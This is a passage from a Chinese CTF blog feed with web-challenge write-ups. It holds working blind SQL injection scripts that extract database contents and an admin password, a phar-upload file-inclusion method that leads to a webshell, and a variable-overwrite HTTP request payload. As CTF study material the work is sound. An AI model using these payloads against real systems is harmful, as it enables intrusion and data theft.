class="string">'123'</span>;</span><br></pre></td></tr></table></figure><p>加入异或符号<code>^</code>是为了能够保证，即使<code>admin</code>用户名不存在，异或1的结果后仍然为<code>true</code>，保证能执行到后面的盲注判断语句<code>substr()=&#39;&#39;</code>。如果该判断语句为<code>true</code>，则会执行<code>pow(9999,100)</code>，产生<strong>溢出错误</strong>，页面返回的结果便是<strong>数据库操作失败</strong>；如果该判断语句为<code>false</code>，则不会执行<code>pow(9999,100)</code>，返回的结果为<strong>登录失败</strong></p><p>通过这种盲注，我写了如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.106.224.151:52105/"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">s = <span class="string">"0123456789qwertyuiopasdfghjklzxcvbnm!@#$%^&amp;*()QWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"' ^ 1 and substr(database(),%d,1)='%s' and pow(9999,100)#"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        print(<span class="string">"checking"</span>,j)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd = passwd + j</span><br><span class="line">            print(<span class="string">"passwd:"</span>,passwd)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>注出数据库名：<code>ctf</code></p><p>但是，题目将<code>or</code>替换<code>QwQ</code>，所以我们无法通过正常利用<code>information_schema</code>库来得到表名和列名信息</p><p>有篇参考文章：<a href="https://nosec.org/home/detail/2245.html" target="_blank" rel="noopener">如何在不知道MySQL列名的情况下注入出数据</a></p><p>里面提到了，在无法知道列名的情况下，我们可以通过<code>select 1,2 union select * from user</code>来注出列下的所有内容，我们只需要猜测表名和查询列数即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以，构造以下payload即可注出密码字段的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; ^ 1 and substr((select `2` from (select 1,2 union select * from user)a limit 1,1),1,1)=&apos;a&apos; and pow(9999,100)#&amp;password=123</span><br></pre></td></tr></table></figure><p>脚本内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.106.224.151:52105/"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">s = <span class="string">"0123456789qwertyuiopasdfghjklzxcvbnm!@#$%^&amp;*()QWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"' ^ 1 and substr((select `2` from (select 1,2 union select * from user)a limit 1,1),%d,1)='%s' and pow(9999,100)#"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        print(<span class="string">"checking"</span>,j)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>最终注出的<code>admin</code>用户的密码<code>f1ag@1s-at_/fll1llag_h3r3</code></p><p>但是仍然无法登陆，后面没有思路便作罢</p><p>赛后发现是存在大小写问题，必须在脚本中利用<strong>ASCII</strong>码进行判断，别的大佬的题解里写出跑出来的结果是<code>F1AG@1s-at_/fll1llag_h3r3</code>，登陆后，发现存在远程连接MySQL的功能，有点类似DDCTF的MYSQL弱口令那道题，一样是要伪造一个MYSQL服务器端来连接最终获取flag，但是由于题目环境关闭了，无法进行复现了，但是这题学习到了一种新型的<strong>基于语法</strong>的盲注和无法得知列名情况下的注入，收获也还是蛮大的</p><h4 id="RefSpace"><a href="#RefSpace" class="headerlink" title="RefSpace"></a>RefSpace</h4><p>题目的地址观察得知首先可以利用<strong>php伪协议</strong>读取源代码，再加上扫描后台以及读取源码中得到的提示，得出了题目的目录结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜ html tree</span><br><span class="line">.</span><br><span class="line">├── app</span><br><span class="line">│ ├── flag.php</span><br><span class="line">│ ├── index.php</span><br><span class="line">│ └── Up10aD.php</span><br><span class="line">├── backup.zip</span><br><span class="line">├── flag.txt</span><br><span class="line">├── index.php</span><br><span class="line">├── robots.txt</span><br><span class="line">└── upload</span><br><span class="line">2 directories, 7 files</span><br></pre></td></tr></table></figure><p>其中注意到的便是网站有上传文件的功能，<code>app/Up10aD.php</code>源码如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>分析源码可知，对上传的文件做了类型的检查，根据类型自动加上后缀名<code>jpg</code>或者<code>gif</code></p><p>在<code>index.php</code>中，存在文件包含：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是自动加上了后缀名<code>php</code></p><p>一开始的想法是上传图片马，然后通过<strong>截断</strong>的方式包含图片马，但是尝试了<code>%00</code>，<code>0x00</code>，<strong>文件长度</strong>截断，都失败了，原因是该题目的php版本为<strong>7.0</strong>以上，而上述尝试的截断方式都仅仅适用于<strong>php5</strong></p><p>所以，尝试了利用<code>phar</code>协议包含文件，具体可以参考：<a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="noopener">zip或phar协议包含文件</a></p><p>具体方法为，使用<code>phar</code>类打包一个<code>phar</code>标准包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/phartest.zip'</span>, <span class="number">0</span>,<span class="string">'phartest'</span>,Phar::ZIP) ; </span><br><span class="line">$x=file_get_contents(<span class="string">'./test.php'</span>);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.php'</span>, $x);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后生成<code>phartest.zip</code>压缩包，里面包含了代码为<code>&lt;?php phpinfo(); ?&gt;</code> 的<code>test.php</code>文件</p><p>然后在<code>app/Up10aD.php</code>文件中上传该压缩包，并修改文件名为<code>phartest</code>，文件类型为<code>image/jpeg</code>，</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这样，上传文件地址就为<code>upload/phartest.jpg</code>，然后访问<code>https://xxx/index.php?route=phar://upload/phartest.jpg/test</code></p><p>即可成功执行<code>phpinfo</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样方法上传一句话木马后<strong>getshell</strong>也只发现存在<code>flag.txt</code>和<code>/ctf/sdk.php</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\国赛\22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有其他思路了，只能就此作罢，后面考察的应该是要绕过<code>app/flag.php</code>中<code>sha1</code>比较，才能拿到flag</p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-Web</title>
    <link href="https://Foxgrin.github.io//posts/6882/"/>
    <id>https://Foxgrin.github.io//posts/6882/</id>
    <published>2019-04-19T07:15:00.000Z</published>
    <updated>2019-04-19T14:18:29.885Z</updated>
    
    <content type="html"><![CDATA[<p>这场比赛难度虽然大，但是一路做下来收获还是蛮大的<a id="more"></a></p><h4 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h4><p>题目链接：<a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a> </p><p>将参数jpg的值进行两次base64解码得到<code>666C61672E6A7067</code>，再进行十六进制转字符串的处理后得到<code>flag.jpg</code>，然后在源代码看到了加载出了<code>flag.jpg</code>文件的源码，怀疑是通过文件读取函数<code>file_get_contents</code>进行读取图片，将<code>index.php</code>进行转十六进制并进行两次base64编码后的值<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code>赋值给参数<code>jpg</code>，得到经过base64加密后的源码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/ddctf/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解密后得到<code>index.php</code>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对读取文件做了过滤处理，首先是通过正则匹配函数过滤除了<code>a-z,A-Z,0-9</code>和小数点<code>.</code>以外的所有字符，并且将关键词<code>config</code>替换为<code>!</code>，看似flag就在<code>config.php</code>中，但是怎么想也绕不了过滤，这时注意到了代码开头的注释部分提示了一个博客地址，仔细翻阅博主的另一篇文章，里面提示一个文件名<code>practice.txt.swp</code>，访问，出现了文件名<code>f1ag!ddctf.php</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/ddctf/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么再次用同样的方法读取<code>flag!ddctf.php</code>文件的源代码，其中的感叹号<code>!</code>在参数中用<code>config</code>代替便可，即参数<code>$file == hex2bin(base64_encode(base64_encode(&#39;f1agconfigddctf.php&#39;)))</code></p><p>获得f1ag!ddctf.php源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察变量覆盖和PHP伪协议，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /f1ag!ddctf.php?k=php://input&amp;uid=hello HTTP/1.1</span><br><span class="line">Host: 117.51.150.246</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>得到flag：<code>DDCTF{436f6e67726174756c6174696f6e73}</code></p><h4 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h4><p>题目链接：<a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a> </p><p><img src="/img/ddctf/3.png" alt=""></p><p>页面有401认证，查看源代码发现页面主题调用了方法<code>auth()</code>，注意到文件<code>js/index.js</code>，对其访问获得源码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/ddctf/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>js代码的大致意思是向<code>http://117.51.158.44/app/Auth.php</code>发送ajax请求，并设置了头部字段<code>didictf_username</code>，尝试头部字段<code>didictf_username:admin</code>时，页面响应内容为：<code>{&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;}</code>，发现了提示文件<code>app/fL2XID2i0Cdh.php</code>，访问后</p><p>可以获得<code>/app/Application.php</code>和<code>/app/Session.php</code>两个文件的源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/app/Application.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/app/Session.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span 